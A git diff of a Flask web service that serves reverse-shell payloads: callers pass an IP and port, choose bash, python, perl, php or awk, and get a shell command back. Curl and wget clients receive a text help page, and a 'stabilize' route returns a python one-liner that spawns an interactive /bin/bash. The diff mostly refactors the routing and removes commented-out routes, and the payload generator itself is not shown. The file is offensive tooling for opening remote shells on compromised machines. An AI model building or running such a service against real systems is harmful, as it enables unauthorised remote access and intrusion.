@@ -1,86 +1,62 @@
 from flask import render_template, Blueprint, request, url_for, redirect
-from .validate_and_generate import payload_generator, valid_ip, valid_port
+from .utils import payload_generator, valid_ip, valid_port
 
 # Returns payload.
 def ret_payload(ip, port, lang, quotes_pref, shell_pref):
-	if valid_ip(ip) == True and valid_port(port) == True:
-		return payload_generator(ip, port, lang, quotes_pref, shell_pref, False)
-	else:
-		return "Invalid IP or Port"
+    if valid_ip(ip) == True and valid_port(port) == True:
+        return payload_generator(ip, port, lang, quotes_pref, shell_pref, False)
+    else:
+        return "Invalid IP or Port"
+
+# Check's if user agent is curl or wget.
+def check_ua():
+    if ("curl" in request.headers.get('User-Agent') or 
+        "Wget" in request.headers.get('User-Agent')):
+        #return render_template('help.txt')
+        return 'shell'
+    return
 
 # Main index blueprint / route.
 index = Blueprint("index", __name__)
+@index.route('<help>', methods=['GET'])
 @index.route('', methods=['GET'])
-def home():
-	return render_template('index.html')
+def home(help=None):
+    # If user agent is a shell return txt help page.
+    if check_ua() == 'shell':
+        return render_template('help.txt')
 
-# Help page.
-@index.route('help', methods=['GET'])
-def help():
-	# If curl or wget return help.txt instead of html help page.
-	if ("curl" in request.headers.get('User-Agent') or 
-		"Wget" in request.headers.get('User-Agent')):
-		return render_template('help.txt')
-	return render_template('help.html')
+    # If request is for help page return help.html page.
+    if help == 'help':
+        return render_template('help.html')
+
+    return render_template('index.html')
 
 # Stabilize shell.
 @index.route('stabilize', methods=['GET'])
 @index.route('reset', methods=['GET'])
 def stabilize():
-	py_stabilise_payload = 'pty=__import__(\"pty\");pty.spawn("/bin/bash")'
-	return f"python -c '{py_stabilise_payload}'\n"
+    py_stabilise_payload = 'pty=__import__(\"pty\");pty.spawn("/bin/bash")'
+    return f"python -c '{py_stabilise_payload}'\n"
 
-## Language Routes.
-### Bash route.
+# Main Web logic.
+@index.route('<string:ip>/<int:port>/', methods=['GET'])
 @index.route('<string:ip>/<int:port>', methods=['GET'])
-@index.route('<string:lang>/<string:ip>/<int:port>', methods=['GET'])
-def lang(ip, port):
-	supported_langs = ["bash", "python", "perl", "php", "awk"]
+def main(ip, port):
+    supported_langs = ["bash", "python", "python3", "perl", "php", "awk"]
 
-	quotes_pref = request.args.get("q", str)
-	shell_pref = request.args.get("s", str)
+    quotes_pref = request.args.get("quotes")
+    shell_pref = request.args.get("shell")
+    lang = request.args.get("lang")
 
-	if lang is None:
-		return ret_payload(ip, port, "bash", quotes_pref, shell_pref)
+    # Default lang, bash.
+    if lang is None:
+        return ret_payload(ip, port, "bash", quotes_pref, shell_pref)
 
-	if lang not in supported_langs:
-		return redirect(url_for('.help'))
+    # Validate supplied lang.
+    if lang not in supported_langs:
+        print("Unsupport Language!")
+        if check_ua == 'shell':
+            return render_template('help.txt')
 
-		
+    return ret_payload(ip, port, lang, quotes_pref, shell_pref)
 
-## Bash route.
-#@index.route('<string:ip>/<int:port>', methods=['GET'])
-#@index.route('bash/<string:ip>/<int:port>', methods=['GET'])
-#def bash(ip, port):
-#	quotes_pref = request.args.get("q", str)
-#	shell_pref = request.args.get("s", str)
-#	return ret_payload(ip, port, "bash", quotes_pref, shell_pref)
-#
-## Python route.
-#@index.route('python/<string:ip>/<int:port>', methods=['GET'])
-#@index.route('python3/<string:ip>/<int:port>', methods=['GET'])
-#def python(ip, port):
-#	quotes_pref = request.args.get("q", str)
-#	shell_pref = request.args.get("s", str)
-#	return ret_payload(ip, port, "python", quotes_pref, shell_pref)
-#
-## Perl route.
-#@index.route('perl/<string:ip>/<int:port>', methods=['GET'])
-#def perl(ip, port):
-#	quotes_pref = request.args.get("q", str)
-#	shell_pref = request.args.get("s", str)
-#	return ret_payload(ip, port, "perl", quotes_pref, shell_pref)
-#
-## PHP route.
-#@index.route('php/<string:ip>/<int:port>', methods=['GET'])
-#def php(ip, port):
-#	quotes_pref = request.args.get("q", str)
-#	shell_pref = request.args.get("s", str)
-#	return ret_payload(ip, port, "php", quotes_pref, shell_pref)
-#
-## Awk route.
-#@index.route('awk/<string:ip>/<int:port>', methods=['GET'])
-#def awk(ip, port):
-#	quotes_pref = request.args.get("q", str)
-#	shell_pref = request.args.get("s", str)
-#	return ret_payload(ip, port, "awk", quotes_pref, shell_pref)
